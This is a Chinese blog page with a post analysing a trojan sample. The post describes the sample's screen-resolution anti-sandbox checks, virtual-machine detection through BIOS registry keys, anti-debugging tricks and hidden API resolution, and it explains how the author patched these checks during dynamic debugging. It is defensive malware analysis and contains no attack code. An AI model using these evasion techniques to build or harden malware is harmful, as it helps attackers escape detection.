<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  

  
  
  
  
  
  
  <title>shanza&#39;s hideout</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="shanza&#39;s hideout">
<meta property="og:url" content="https://shanzade.github.io/index.html">
<meta property="og:site_name" content="shanza&#39;s hideout">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="shanza">
<meta name="twitter:card" content="summary">
  
  
    <link rel="icon" href="/css/images/favicon.ico">
  
  
<link rel="stylesheet" href="/css/style.css">

  

  
  <!-- baidu webmaster push -->
  <!-- <script src='//push.zhanzhang.baidu.com/push.js'></script> -->
<meta name="generator" content="Hexo 7.3.0"></head>
<body class="home blog custom-background custom-font-enabled single-author">
  <div id="page" class="hfeed site">
      <header id="masthead" class="site-header" role="banner">
    <hgroup>
      <h1 class="site-title">
        <a href="/" title="shanza&#39;s hideout" rel="home">shanza&#39;s hideout</a>
      </h1>
      
        <h2 class="site-description hitokoto">为君聊赋今日诗，努力请从今日始。</h2>
        <!-- <script type="text/javascript" src="https://v1.hitokoto.cn/?encode=js"></script> -->
      
    </hgroup>

    <nav id="site-navigation" class="main-navigation" role="navigation">
            <button class="menu-toggle">菜单</button>
            <a class="assistive-text" href="/#content" title="跳至内容">跳至内容</a><!--TODO-->
            <div class="menu-main-container">
                <ul id="menu-main" class="nav-menu">
                
                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/">Home</a></li>
                
                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/archives">Archives</a></li>
                
                </ul>
            </div>
    </nav>
</header>

      <div id="main" class="wrapper">
        <div id="primary" class="site-content"><div id="content" role="main">
  
    <article id="post-si1verf0x-2-对一份样本的浅分析（有待完善）" class="post-si1verf0x-2-对一份样本的浅分析（有待完善） post type-post status-publish format-standard hentry">
    <!---->

      <header class="entry-header">
        
        
  
    <h1 class="entry-title">
      <a class="article-title" href="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/">si1verf0x #2: 对一份样本的浅分析（有待完善）</a>
    </h1>
  

        
        <div class="comments-link">
            
            <a href="javascript:void(0);" data-url="https://shanzade.github.io/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/" data-id="cmjjqvfjn0005ekvghyb6hm5a" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
        </div><!-- .comments-link -->
      </header><!-- .entry-header -->

    <div class="entry-content">
      
        <h1 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h1><blockquote>
<p>样本<br><a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-2066929-1-1.html">https://www.52pojie.cn/thread-2066929-1-1.html</a><br>沙箱（其一，提示银狐）<br><a target="_blank" rel="noopener" href="https://sandbox.ti.qianxin.com/sandbox/page/detail?type=file&id=AZoAiMSUONZSmF3-H7sC">https://sandbox.ti.qianxin.com/sandbox/page/detail?type=file&amp;id=AZoAiMSUONZSmF3-H7sC</a></p>
</blockquote>
<h1 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h1><p>64 位，无壳，5 个段。<br><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/1.png"></p>
<h2 id="dll-导入情况"><a href="#dll-导入情况" class="headerlink" title="dll 导入情况"></a>dll 导入情况</h2><p><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/2.png"></p>
<p><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/3.png"></p>
<p><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/4.png"></p>
<p><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/5.png"></p>
<p><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/6.png"></p>
<p><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/7.png"></p>
<p><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/8.png"></p>
<h1 id="直接运行"><a href="#直接运行" class="headerlink" title="直接运行"></a>直接运行</h1><p>（似乎是检测到虚拟机直接自毁了。）</p>
<h1 id="检测分辨率-反在线运行沙箱"><a href="#检测分辨率-反在线运行沙箱" class="headerlink" title="检测分辨率 &#x2F; 反在线运行沙箱"></a>检测分辨率 &#x2F; 反在线运行沙箱</h1><p>似乎是利用了在线沙箱的 <code>1024*768</code> 分辨率的特点，这个木马运行之前首先会检测分辨率。<br>为什么这么说？第一次在虚拟机运行时，它会访问一个不存在的位置。</p>
<p><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/9.png"></p>
<p>查看堆栈，发现返回指针为 <code>140010ea1</code>。跟踪，会看到一个 <code>memset</code>。</p>
<p><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/10.png"></p>
<p><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/11.png"></p>
<p>这个 <code>memset</code> 的目的地址指向了 0（<code>140010e8f</code> 断点动调可知），很显然是不可能的。<br>往上追查，发现这里是 <code>sub_14000fc80</code> 函数，正好是 <code>main</code> 函数调用的第一个函数。<br><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/12.png"></p>
<p>虽说没有加壳，但是整个样本全是混淆加密（控制流平坦化？），用 api monitor 甚至截取不到上面 <code>memset</code> 的记录。<br>所以还是一步步动调了。先下断点。</p>
<p><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/13.png"></p>
<p>首先调用了 <code>GetDC()</code> 获取窗口句柄。<br><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/14.png"></p>
<p>然后调用 <code>GetDeviceCaps()</code> 获取窗口信息。这里是获取了屏幕的宽度 <code>DESKTOPHORZRES</code> 0x76&#x3D;118。<br><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/15.png"><br><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/16.png"></p>
<p>再往下走，获取屏幕高度 0x75&#x3D;117。<br><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/17.png"></p>
<p>最后释放句柄。<br><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/18.png"></p>
<p>问题来了，<code>140010a63</code> 这里，把刚才获取的屏幕宽度拿了出来，然后减去 0x780 即 1920。<br><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/19.png"><br>如果屏幕宽度小于这个数的话，不出意外就要跑到刚才 <code>memset</code> 的位置，从而报错。</p>
<p>另外还有对高度的判断 <code>140010bc3</code>。<br><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/20.png"></p>
<p>在线沙箱似乎没有 1080p 的，所以判断完这两个条件就直接调用 <code>memset(0, 0, x)</code> 报错退出了，也就无法自助分析后面发生了什么。</p>
<p>另外，在 <code>sub_140012850</code> 这个函数中也检测了分辨率，跟上面的不太一样。<br>给 <code>14004402c</code> 下断点可以断到 <code>GetDeviceCaps</code>，往上追查会发现两次调用，也是获取了分辨率信息。<br><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/21.png"><br><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/22.png"></p>
<p>分别给两个内存位置下断点，继续运行，会跳转到一个减法运算。<br><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/23.png"><br><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/24.png"><br>把这块 patch 为 <code>sub ecx ecx</code>，会发现还有第二个判断（高度）。<br><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/25.png"><br>同样，patch 为 <code>sub eax, eax</code>。<br>后面还有两次判断，都 patch 就可以绕过分辨率检测了。</p>
<h1 id="sub-140010ed0-检查虚拟机"><a href="#sub-140010ed0-检查虚拟机" class="headerlink" title="sub_140010ed0 检查虚拟机"></a><code>sub_140010ed0</code> 检查虚拟机</h1><p><code>main</code> 函数调用的第二个函数。</p>
<p>这里会遍历三次进程，但是看不懂是在做什么（加密还是太难受了）。<br><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/26.png"></p>
<p>接下来会调用 <code>RegOpenKey()</code> 查询系统信息 <code>HKLM\HARDWARE\DESCRIPTION\SYSTEM\BIOS</code>。<br><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/27.png"></p>
<p><code>RegQueryValueExA</code> 获取 <code>SystemManufacturer</code> 这个键。<br><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/28.png"></p>
<p>根据注册表键来看，就是在检测虚拟机。<br>这里继续运行的话还会发现检测 <code>SystemProductName</code> 这个键。<br><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/29.png"></p>
<p>所以这里改掉先了，让样本再跑一会。<br><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/30.png"></p>
<p>（根据 api monitor 的调用结果来看的话，这里是会把所有虚拟机类型都检测一遍。（截图在文章最后））</p>
<h1 id="sub-1400040a0-反调试和解密加载库函数"><a href="#sub-1400040a0-反调试和解密加载库函数" class="headerlink" title="sub_1400040a0 反调试和解密加载库函数"></a><code>sub_1400040a0</code> 反调试和解密加载库函数</h1><p>控制流平坦化确实不会解（没想到随机找个样本都能找到这么复杂的）。<br>这个函数也包含了很多混淆和加密了的内容，但是基本上都是跟着 <code>call / jmp</code> 走就能理解个八九成。</p>
<p>首先这个函数在栈上开辟一块空间用来存了一些数据。<br><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/31.png"></p>
<p>接下来调用 <code>sub_140005700</code> 这个函数，这里没有识别出来。<br><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/32.png"></p>
<p>看汇编，发现是故意设计了一个异常处理，反调试用的。<br>动调的时候会发现 <code>rax</code> 无论如何都是 0，也就是说 <code>[rax]</code> 会触发异常。<br><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/33.png"><br><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/34.png"></p>
<p>这时候要在 x64dbg 中设置对这个异常的绕过，让病毒继续运行。<br><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/35.png"></p>
<p>根据汇编分析，捕获异常后就会跳转到 <code>sub_140005750</code> 继续运行。<br>这里是另外一个反调试的位置。分别用了三种方式进行反调试。<br>一是 <code>IsDebuggerPresent()</code>，二是检查 peb 中的 <code>BeingDebugged</code> 这个成员，三是通过计时器计算检测是否存在运行停顿，因为一般来讲系统调度进程不会超过太长时间。<br><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/36.png"></p>
<p>这里需要修补一下，把 <code>mov al, 1</code> 改为 0 就行。<br><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/37.png"></p>
<p>如果不修补的话，动调就会跳转到 <code>memset 0</code> 的函数，样本崩溃退出。<br><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/38.png"><br><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/39.png"></p>
<p>接下来的 <code>sub_140005840</code> 是初始化函数。大致执行流程如下。<br><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/40.png"></p>
<p>前四个函数和 <code>main</code> 函数是一致的，就是检测系统各项属性然后判断运行环境是否正常。<br>但是第 5 个函数 <code>sub_1400226e0</code>，应该是全部函数里面加密最多的地方。但是基本都有固定的模式，跟着 <code>call / jmp</code> 走就可以了。（这里 ida 分析比较冗余所以就不放出来了，毕竟看了也看不懂）<br>以下动调分析过程可忽略。<br>首先，动调进入 <code>sub_1400226e0</code> 这个函数，<code>f4</code> 跳到第一个 <code>call</code> 的位置。此时再 <code>f8</code> 走一步，就会发现栈上自动解析出了 dll 字符串。<br><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/41.png"></p>
<p>很神奇。继续 <code>f4</code> 到下一个 <code>call</code>，会发现果不其然加载了库 <code>advapi32.dll</code> 。<br><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/42.png"></p>
<p>此时略过一堆解密内容到下一个 <code>call</code>，会发现加载了 <code>shell32.dll</code>。<br><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/43.png"></p>
<p>接下来的 4 个 <code>call</code> 与 <code>main</code> 函数的前 4 个函数调用一致，就不讲了。<br>下一个 <code>call</code>，执行完成之后似乎什么都没有发生。<br><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/44.png"></p>
<p>但是如果再跳到下一个，执行，就会发现栈上突然多出来了一个函数名称 <code>OpenSCManagerW</code>。这个函数恰好是 <code>advapi32</code> 里的函数。<br><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/45.png"></p>
<p>同样的汇编指令，下一个 <code>call</code> 解析出了 <code>OpenServiceA</code>。<br><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/46.png"></p>
<p>实际上，整个函数的工作就是在解密，然后获取 dll 句柄和库函数地址。<br>这里查找库函数似乎没有调用 <code>GetProcAddress</code>（下了断点但是没有断到），而是调用了一个手动实现查找的函数 <code>sub_140032be0</code>，估计是用来防止杀毒软件检测的。<br><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/47.png"></p>
<p>将所有 <code>call</code> 跑一遍，可以得到最终获取的库函数。（其实把分辨率检测那块代码 patch 之后扔给在线沙箱，似乎也能分析出来。）<br><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/48.png"></p>
<h1 id="消息"><a href="#消息" class="headerlink" title="消息"></a>消息</h1><p>异常处理完之后就会返回到 <code>main</code> 函数中继续执行。<br><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/49.png"></p>
<p>如果单步执行完 <code>GetMessageW</code>，会发现返回的消息类型是 0x113，即 <code>WM_TIMER</code>。<br><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/50.png"><br><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/51.png"></p>
<p>这里估计也是一种反检测的方式，通过消息机制绕过了静态分析。<br>执行到 <code>DispatchMessageW</code>，会发现回调函数（似乎）是 <code>sub_1400059e0</code>。<br><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/52.png"></p>
<p>这里我猜测是通过每次接收到一个消息就递增一次计数器，然后解密执行流并调用先前获取到的各个库函数。<br><del>这里硬着头皮动调分析了一小部分内容。</del><br><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/53.png"></p>
<h1 id="接下来"><a href="#接下来" class="headerlink" title="接下来"></a>接下来</h1><p>为什么到这里就结束了呢？因为绕不过它的虚拟机检测了，手上也没有可以用来直接分析的实机。。<br>除了前面注册表信息之外，还有显卡型号的检测。但是个人水平有限，即使尝试着把显卡检测绕过了（patch 了调用 <code>strstr</code> 的函数），也还是不知道哪里还有检测导致自毁。<br><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/54.png"><br><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/55.png"><br><img src="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/56.png"></p>
<p>然后还尝试了把分辨率检测给 patch，再上传沙箱，但是依旧运行不成功。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
<li>还是要从最基础的做起，这种难度还是有点大（<del>以后再回来看看</del>）</li>
<li>了解了两种反调试方法：<code>IsDebuggerPresent()</code> 和 <code>PEB-&gt;BeingDebugged</code></li>
<li>了解了样本分析中一些常见的 win32 api。</li>
</ul>

      
    </div><!-- .entry-content -->

    <footer class="entry-meta">
    <a href="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/">
    <time datetime="2025-12-20T13:10:11.000Z" class="entry-date">
        2025-12-20
    </time>
</a>
    
  <span class="article-delim">&#8226;</span>
  <div class="article-category">
  <a class="article-category-link" href="/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88windows%EF%BC%89/">恶意代码分析（windows）</a>
  </div>

    
    </footer>
</article>






  
    <article id="post-跟着52pojie大佬分析一份木马样本" class="post-跟着52pojie大佬分析一份木马样本 post type-post status-publish format-standard hentry">
    <!---->

      <header class="entry-header">
        
        
  
    <h1 class="entry-title">
      <a class="article-title" href="/2025/12/07/%E8%B7%9F%E7%9D%8052pojie%E5%A4%A7%E4%BD%AC%E5%88%86%E6%9E%90%E4%B8%80%E4%BB%BD%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC/">跟着52pojie大佬分析一份木马样本</a>
    </h1>
  

        
        <div class="comments-link">
            
